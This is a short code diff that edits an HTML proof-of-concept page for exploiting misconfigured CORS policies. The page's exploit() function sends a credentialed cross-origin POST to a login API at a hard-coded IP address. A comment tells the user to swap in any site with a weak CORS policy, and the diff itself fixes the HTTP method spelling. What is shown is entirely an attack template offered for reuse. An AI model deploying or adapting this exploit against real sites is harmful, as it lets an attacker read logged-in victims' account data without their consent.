@@ -24,9 +24,7 @@ font: 10pt comic sans ms;
 color: white;
 }
 </STYLE>
-<header>
 <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-</header>
 <body bgcolor=black>
 <div align=center>
 <table width="100%" cellspacing="0" cellpadding="0" class="tb1" style="border: dashed 2px #333">
@@ -53,7 +51,7 @@ function exploit() {
      
       }
  };
- xhttp.open("POSt", "http://139.224.42.111/api/user/passport/login", true); //change the URL to the one which has mis-configured CORS policy
+ xhttp.open("POST", "http://139.224.42.111/api/user/passport/login", true); //change the URL to the one which has mis-configured CORS policy
 
 
  xhttp.withCredentials = true;
